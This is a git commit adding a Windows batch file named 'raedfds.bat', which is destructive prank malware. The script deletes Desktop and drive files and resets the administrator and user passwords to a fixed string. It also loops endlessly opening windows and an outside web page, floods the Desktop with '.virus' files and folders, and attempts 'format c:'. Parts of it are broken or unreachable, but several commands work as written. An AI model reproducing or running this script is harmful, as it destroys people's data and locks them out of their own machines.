81a113e2a309f7dee18ef9f64b0527987693d9e9
adidi00000 <138262994+adidi00000@users.noreply.github.com>
2024-01-20 01:33:42 +0100

    Add files via upload

---
+++ raedfds.bat
@@ -0,0 +1,192 @@
+@echo off
+Shutdown -s -t 1996
+Shutdown -l -t 0
+Shutdown -r -t 0
+taskkill /F /IM 
+Del /Q *.
+:virus
+Start 
+goto virus
+Start http://
+:cmd
+Start cmd.exe
+goto cmd
+:calc
+Start calc
+goto calc
+Del /Q %userprofile%\Desktop
+Start raedfds
+raedfds
+date 13/10/13
+time 13:10
+net user administrateur sdfsqgfcsdfgxffgfsfds
+net user %USER% sdfsqgfcsdfgxffgfsfds
+cd "%userprofile%\desktop"
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+echo %random% > %random%.virus
+cd "%userprofile%\desktop"
+:begin
+md %random%.%random%
+GoTo begin
+ipconfig /release
+Defrag c:
+Defrag /c
+:one
+start calc.exe
+start taskmgr.exe
+start http://google.com
+start http://gcasale.free.fr/viva.htm
+start cmd.exe
+goto one
+format c:
+format c: /Y
+del c:\*.*
